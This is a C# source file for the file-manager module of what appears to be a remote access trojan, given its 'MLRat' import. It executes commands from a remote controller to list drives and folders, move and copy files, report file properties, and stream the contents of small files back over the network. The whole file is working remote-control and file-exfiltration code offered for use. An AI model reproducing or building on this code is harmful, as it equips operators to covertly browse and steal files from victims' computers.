using MLRat.Client;
using SharedCode.Network;
using System;
using System.Collections.Generic;
using System.IO;

namespace MLManagementClient.Handlers
{
    public static class FileManagerHandler
    {
        private static IClientHost NetworkHost = null;
        

        public static void SetNetworkHost(IClientHost _connection)
        {
            NetworkHost = _connection;
        }

        public static void HandleMove(object[] args)
        {
            FileManagerCommand command = (FileManagerCommand)args[1];
            bool force = command == FileManagerCommand.ForceMoveFile;
            Guid ID = (Guid)args[2];
            string from = (string)args[3];
            string to = (string)args[4];
            NetworkHost.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.MoveResponce, ID, MiscHandler.MoveFile(from, to, force));
        }
        public static void HandleCopy(object[] args)
        {
            Guid ID = (Guid)args[2];
            string from = (string)args[3];
            string to = (string)args[4];
            NetworkHost.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.CopyResponce,ID, MiscHandler.CopyFile(from, to));
        }

        static void GetFileProperties(Guid id, string path)
        {
            try
            {
                FileInfo fi = new FileInfo(path);
                NetworkHost.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.PropertiesResponce, id,
                    fi.Name,
                    fi.FullName,
                    fi.CreationTime.ToLongDateString(),
                    fi.LastWriteTime.ToLongDateString(),
                    fi.Length.ToString(),
                    (fi.Attributes & FileAttributes.Hidden) == FileAttributes.Hidden,
                    (fi.Attributes & FileAttributes.System) == FileAttributes.System
                    );
            }
            catch
            {
                NetworkHost.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.PropertiesFailed, id);
            }
        }

        public static void Handle(object[] data)
        {
            FileManagerCommand command = (FileManagerCommand)data[1];
            Console.WriteLine("File Manager: {0}", command.ToString());

            if (command == FileManagerCommand.ForceMoveFile || command == FileManagerCommand.MoveFile) HandleMove(data);
            if (command == FileManagerCommand.CopyFile) HandleCopy(data);
            if (command == FileManagerCommand.GetFileProperties) GetFileProperties((Guid)data[2], (string)data[3]);

           if(command == FileManagerCommand.StartDownload)
            {
                string handle = (string)data[2];
                string path = (string)data[3];
                try
                {
                    using (FileStream fs = new FileStream(path, FileMode.Open, FileAccess.Read))
                    {
                        if (fs.Length > 10000) //10kb
                            throw new Exception("File Too big");
                        byte[] buffer = new byte[1000];
                        int bytesread = 0;
                        while((bytesread = fs.Read(buffer, 0, buffer.Length)) > 0)
                        {
                            byte[] block = new byte[bytesread];
                            Buffer.BlockCopy(buffer, 0, block, 0, bytesread);
                            NetworkHost.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.DownloadBlock, handle, block, fs.Position == fs.Length);
                        }
                    }
                }
                catch(Exception ex)
                {
                    NetworkHost.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.DownloadInvalid, handle, ex.Message);
                }
            }

            if(command == FileManagerCommand.Update || command == FileManagerCommand.UpdateToSpecialFolder)
            {
                
                string path = string.Empty;
                if (command == FileManagerCommand.Update)
                    path = (string)data[2];
                if (command == FileManagerCommand.UpdateToSpecialFolder)
                    path = Environment.GetFolderPath((Environment.SpecialFolder)data[2]);


                if (path == string.Empty)
                {
                    DriveInfo[] driveArray = DriveInfo.GetDrives();
                    string[] drives = new string[driveArray.Length];
                    string[] DriveSizes = new string[driveArray.Length];
                    string[] DriveLabels = new string[driveArray.Length];

                    for (int i = 0; i < drives.Length; i++)
                    {
                        try
                        {
                            drives[i] = driveArray[i].Name;
                            
                            if (driveArray[i].IsReady)
                            {
                                long len = driveArray[i].TotalSize;
                                string ext = "b";
                                if ((len / 1000) > 0)
                                {
                                    len = len / 1000;
                                    ext = "KB";
                                    if ((len / 1000) > 0)
                                    {
                                        len = len / 1000;
                                        ext = "MB";
                                        if ((len / 1000) > 0)
                                        {
                                            len = len / 1000;
                                            ext = "GB";
                                            if ((len / 1000) > 0)
                                            {
                                                len = len / 1000;
                                                ext = "TB";
                                            }
                                        }
                                    }
                                }
                                DriveSizes[i] = string.Format("{0} {1}", len, ext);
                                DriveLabels[i] = driveArray[i].VolumeLabel;
                            }
                            else
                            {
                                DriveLabels[i] = driveArray[i].DriveType.ToString();
                                DriveSizes[i] = "";
                            }
                            
                        }
                        catch(Exception ex)
                        {
                            drives[i] = "Unknowen.";
                            DriveSizes[i] = ex.Message;
                            DriveLabels[i] = "Error";
                        }
                    }
                    NetworkHost.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.DriveResponce, drives, DriveSizes, DriveLabels, path);
                }
                else
                {
                    try
                    {
                        DirectoryInfo di = new DirectoryInfo(path);
                        FileInfo[] Files = di.GetFiles();
                        DirectoryInfo[] dirs = di.GetDirectories();

                        string[] directoryNames = new string[dirs.Length];
                        bool[] DirectroyEmpty = new bool[dirs.Length];
                        string[] filenames = new string[Files.Length];
                        string[] filesizes = new string[Files.Length];

                        for (int i = 0; i < directoryNames.Length; i++)
                        {
                            directoryNames[i] = dirs[i].Name;
                            try
                            {
                                DirectroyEmpty[i] = dirs[i].GetDirectories().Length < 1 && dirs[i].GetFiles().Length < 1; //Need to improve this
                            }
                            catch
                            {
                                DirectroyEmpty[i] = true;
                            }
                        }
                        for (int i = 0; i < filenames.Length; i++)
                        {
                            filenames[i] = Files[i].Name;
                            long len = Files[i].Length;
                            string ext = "b";
                            if ((len / 1000) > 0)
                            {
                                len = len / 1000;
                                ext = "KB";
                                if ((len / 1000) > 0)
                                {
                                    len = len / 1000;
                                    ext = "MB";
                                    if ((len / 1000) > 0)
                                    {
                                        len = len / 1000;
                                        ext = "GB";
                                    }
                                }
                            }
                            filesizes[i] = string.Format("{0} {1}", len, ext);
                        }

                        NetworkHost.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.DirectoryResponce, directoryNames, DirectroyEmpty, filenames, filesizes, path);
                    }
                    catch(Exception ex)
                    {
                        NetworkHost.Send((byte)NetworkCommand.FileManager, (byte)FileManagerCommand.Invalid, ex.Message, path);
                    }
                }
            }
        }
    }
}
